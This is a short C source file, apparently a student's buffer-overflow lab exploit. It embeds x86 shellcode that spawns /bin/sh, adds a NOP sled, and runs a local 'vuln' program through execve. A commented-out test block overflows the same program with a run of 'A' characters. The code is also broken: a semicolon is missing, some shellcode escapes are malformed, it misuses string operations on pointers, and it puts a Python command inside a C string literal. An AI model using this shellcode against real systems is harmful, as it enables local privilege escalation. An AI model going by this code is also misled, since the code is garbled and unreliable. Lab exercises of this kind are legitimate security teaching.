/*
CECS 478 Assignment #7 - Buffer Overflow Lab.
By IL WON SON
*/
#include <stdio.h>
int main(int argc, char **argv){
	char shellcode[] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88"
					   "\x42\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c"
					   "\xcd\c80\ce8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
	char *arg[3];
	arg[0] = "./vuln";
	arg[1] = "$(python -c \"print '\x90' * 478";
	arg[2] = NULL;
	int i;
	
	for(i = 0; i < 478; i++)
		arg[1]+='\x90';
	for(i = 0; i < strlen(shellcode); i++)
		*arg+=shellcode[i];
	
	execve(arg[0], arg, NULL);
	return(0);
}
/*
int main(){
	char *arg[3];
	arg[0] = "./vuln";
	arg[1] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	arg[2] = NULL;
	execve(arg[0], arg, NULL);
	return(0);
*/
